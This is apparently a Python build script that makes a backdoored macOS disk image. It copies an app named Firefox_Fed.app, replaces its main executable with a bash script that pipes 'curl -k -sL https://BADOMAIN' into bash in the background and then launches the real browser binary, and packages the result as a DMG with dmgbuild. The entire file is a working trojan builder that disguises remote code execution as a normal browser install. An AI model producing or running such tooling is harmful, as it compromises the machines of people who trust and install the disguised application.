import shutil, errno, os
from sys import exit
from os import system
import dmgbuild
import time

temp = "./DMG_Settings/"
build = "./build/" 
def copyanything(src, dst):
    try:
        shutil.copytree(src, dst)
    except OSError as error:
        shutil.rmtree(dst)
        print("[+] Build directory cleared")
        shutil.copytree(src, dst)
copyanything(temp,build) 

def scripting():
    copyanything("/Applications/Firefox_Fed.app" , build + "/Firefox_Fed.app")
    print("[+] Target app copied to build")
    app = open(build + "/Firefox_Fed.app/Contents/MacOS/firefox", 'w')
    app.write('#!/bin/bash\n')
    app.write('curl -k -sL https://BADOMAIN | bash &\n')
    app.write('/Volumes/Firefox_Fed/Firefox_Fed.app/Contents/MacOS/firefox-bin&\n')

scripting()
print("[+] Main executable replaced with backdoor script")
time.sleep(2)
os.system("chmod +x ./build/Firefox_Fed.app/Contents/MacOS/firefox")
print("[+] helper made executable")
os.chdir(build)
print("[+] Assembling DMG")
dmgbuild.build_dmg('Firefox_Fed.dmg', 'Firefox_Fed', 'settings.json')
